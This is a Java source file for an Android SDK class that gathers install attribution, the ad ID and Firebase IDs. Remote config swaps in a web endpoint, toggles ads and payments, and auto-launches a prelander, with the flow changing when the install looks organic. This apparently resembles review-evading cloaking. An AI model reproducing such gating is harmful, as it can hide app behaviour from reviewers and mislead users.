package com.ma.fbsdk;

import static com.ma.fbsdk.utils.Utils.getElapsedTimeInSeconds;

import android.app.Activity;
import android.app.Application;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.RemoteException;
import android.view.View;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;

import com.adjust.sdk.Adjust;
import com.adjust.sdk.AdjustConfig;
import com.adjust.sdk.AdjustEvent;
import com.android.installreferrer.api.InstallReferrerClient;
import com.android.installreferrer.api.InstallReferrerStateListener;
import com.android.installreferrer.api.ReferrerDetails;
import com.google.firebase.FirebaseApp;
import com.google.firebase.analytics.FirebaseAnalytics;
import com.google.gson.Gson;
import com.ma.fbsdk.models.Params;
import com.ma.fbsdk.models.Payments;
import com.ma.fbsdk.observer.DynURL;
import com.ma.fbsdk.observer.Events;
import com.ma.fbsdk.observer.URLObservable;
import com.ma.fbsdk.ui.AppFileActivity;
import com.ma.fbsdk.ui.PrelanderActivity;
import com.ma.fbsdk.utils.Constants;
import com.ma.fbsdk.utils.FirebaseConfig;
import com.ma.fbsdk.utils.Utils;

import org.greenrobot.eventbus.EventBus;
import org.greenrobot.eventbus.Subscribe;
import org.greenrobot.eventbus.ThreadMode;

public class MobFlow  implements Application.ActivityLifecycleCallbacks {

    private static MobFlow instance;
    Params webParams = new Params();
    Long timestamp;
    static URLObservable ov;
    InstallReferrerClient referrerClient;
    MobFlowListener listener;
    Context context;
    public View upgrade_premium;

    public boolean isLaunched = false;
    FirebaseConfig fc ;

    public interface MobFlowListener {
        public void onDataLoaded();
    }

    public static MobFlow getInstance() {

        if (instance == null) {
            instance = new MobFlow();
        }

        return instance;
    }

    public void init( Activity activity, MobFlowListener listener){

        this.listener = listener;
        this.context = activity;

        Application app = (Application) Utils.makeContextSafe(context.getApplicationContext());
        app.registerActivityLifecycleCallbacks(this);

        FirebaseApp.initializeApp(this.context);

        initAdjust();
        getGoogleInstallReferrer();
        getRemoteConfig(activity);

        ov = new URLObservable();
        EventBus.getDefault().register(this);

    }

    @Subscribe(threadMode = ThreadMode.MAIN)
    public void onMessageEvent(DynURL o) {

        listener.onDataLoaded();
    }

    public void addUpgradeToPremiumButton( View upgrade_b) {

        upgrade_premium = upgrade_b;
        upgrade_premium.setVisibility(fc.show_update_button ? View.VISIBLE : View.GONE);

        upgrade_premium.setOnClickListener(view -> {
            runApp();
        });
    }

    private void getRemoteConfig(Activity activity){

        fc = FirebaseConfig.getInstance();
        fc.fetchVaues(activity, () -> {

            try {
                callURL();
                initAdjustAdditionalCallback();
                Gson gson = new Gson();
                fc.payments = gson.fromJson(fc.payment_options, Payments[].class);

                ov.api_should_start(Events.FIREBASE_REMOTE_CONFIG);

            } catch (Exception e) {
                Utils.logEvent(this.context, Constants.firbase_remote_config_fetch_error, "");
                e.printStackTrace();
            }
        });
    }

    private void initAdjust() {
        String appToken = this.context.getString(R.string.adjust_token);
        String environment = AdjustConfig.ENVIRONMENT_PRODUCTION;
        AdjustConfig config = new AdjustConfig(this.context, appToken, environment);

        config.setOnAttributionChangedListener(attribution -> {

            Utils.logEvent(this.context, Constants.adjust_attr_received_in_  , "" + getElapsedTimeInSeconds(timestamp));

            if (attribution != null) {
                webParams.setAdjustAttribution(attribution.toString());
            }
        });

        config.setOnDeeplinkResponseListener(deeplink -> {

            webParams.setDeeplink(deeplink.toString());
            return false;

        });

        Adjust.getGoogleAdId(this.context, googleAdId -> webParams.setGoogleAdId(googleAdId));
        Adjust.onCreate(config);

        Adjust.addSessionCallbackParameter("user_uuid", Utils.generateClickId(this.context));
        String versionCode = BuildConfig.VERSION;
        Adjust.addSessionCallbackParameter("m_sdk_version", versionCode);
        Utils.logEvent(this.context, Constants.m_sdk_version + versionCode, "");

    }

    private void initAdjustAdditionalCallback() {
        try {
            FirebaseAnalytics.getInstance(this.context).getAppInstanceId().addOnCompleteListener(task -> {
                webParams.setFirebaseInstanceId(task.getResult());
                AdjustEvent adjustEvent = new AdjustEvent(fc.f_event_token);
                adjustEvent.addCallbackParameter("eventValue", task.getResult());
                adjustEvent.addCallbackParameter("user_uuid", Utils.generateClickId(this.context));
                Adjust.trackEvent(adjustEvent);
                Utils.logEvent(this.context, Constants.firbase_instanceid_sent, "");
            });
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void getGoogleInstallReferrer() {
        referrerClient = InstallReferrerClient.newBuilder(this.context).build();
        referrerClient.startConnection(new InstallReferrerStateListener() {
            @Override
            public void onInstallReferrerSetupFinished(int responseCode) {
                switch (responseCode) {
                    case InstallReferrerClient.InstallReferrerResponse.OK:
                        try {
                            generateInstallReferrer();
                        } catch (RemoteException e) {
                            e.printStackTrace();
                            Utils.logEvent( context, Constants.google_ref_attr_remote_except, "");
                        }
                        break;
                    case InstallReferrerClient.InstallReferrerResponse.FEATURE_NOT_SUPPORTED:
                        // API not available on the current Play Store app.
                        Utils.logEvent(context, Constants.google_ref_attr_error_feature_not_supported, "");
                        break;
                    case InstallReferrerClient.InstallReferrerResponse.SERVICE_UNAVAILABLE:
                        // Connection couldn't be established.
                        Utils.logEvent(context, Constants.google_ref_attr_error_service_unavailable, "");
                        break;
                }

                ov.api_should_start(Events.GOOGLE_REFERRER);
            }

            @Override
            public void onInstallReferrerServiceDisconnected() {
                // Try to restart the connection on the next request to
                // Google Play by calling the startConnection() method.
                Utils.logEvent(context, Constants.google_ref_attr_error_service_disconnected, "");
            }
        });
    }

    private void generateInstallReferrer() throws RemoteException {
        try {
            Utils.logEvent(this.context, Constants.google_ref_attr_received_in_ + getElapsedTimeInSeconds(timestamp), "");
            ReferrerDetails response = this.referrerClient.getInstallReferrer();
            webParams.setGoogleAttribution(response.getInstallReferrer());

        } catch (Exception e) {
            e.printStackTrace();
            Utils.logEvent(this.context, Constants.google_ref_attr_received_exception, "");
        }
    }

    private void callURL() {

        String endURL = fc.finalEndp;

        if (endURL != null && !endURL.equals("")) {
            Constants.showAds = false;
            if (endURL.startsWith("http")) {
                Constants.setEndP(this.context, endURL);
            } else {
                Constants.setEndP(this.context, "https://" + endURL);
            }
        }
    }

    private void runApp() {

        Utils.logEvent(context, Constants.sdk_start , "");

        String attribution = webParams.getGoogleAttribution();

        if (!BuildConfig.DEBUG) {
            if (attribution == null || attribution.isEmpty() || attribution.toLowerCase().contains("organic") || attribution.toLowerCase().contains("play-store")) {
                Utils.logEvent(this.context, Constants.sdk_stopped_organic, "");
                Utils.logEvent(this.context, Constants.open_native_app_organic , "");

                Intent pintent = new Intent(this.context, PrelanderActivity.class);
                pintent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                pintent.putExtra("webParams", webParams);
                this.context.startActivity(pintent);

            }
        }else{

            if(fc.bypass_payment_options){
                Intent intent = new Intent(this.context, AppFileActivity.class);
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                intent.putExtra("webParams", webParams);
                this.context.startActivity(intent);

            }else{
                Intent intent = new Intent(this.context, PrelanderActivity.class);
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                intent.putExtra("webParams", webParams);
                this.context.startActivity(intent);
            }
        }
    }

    @Override
    public void onActivityCreated(@NonNull Activity activity, @Nullable Bundle bundle) {

        if (fc.auto_run_sdk && !isLaunched) {
            isLaunched = true;
              runApp();
        }
    }

    @Override
    public void onActivityStarted(@NonNull Activity activity) {
    }

    @Override
    public void onActivityResumed(@NonNull Activity activity) {
        Adjust.onResume();
    }

    @Override
    public void onActivityPaused(@NonNull Activity activity) {
        Adjust.onPause();
    }

    @Override
    public void onActivityStopped(@NonNull Activity activity) {
    }

    @Override
    public void onActivitySaveInstanceState(@NonNull Activity activity, @NonNull Bundle outState) {
    }

    @Override
    public void onActivityDestroyed(@NonNull Activity activity) {
    }
}
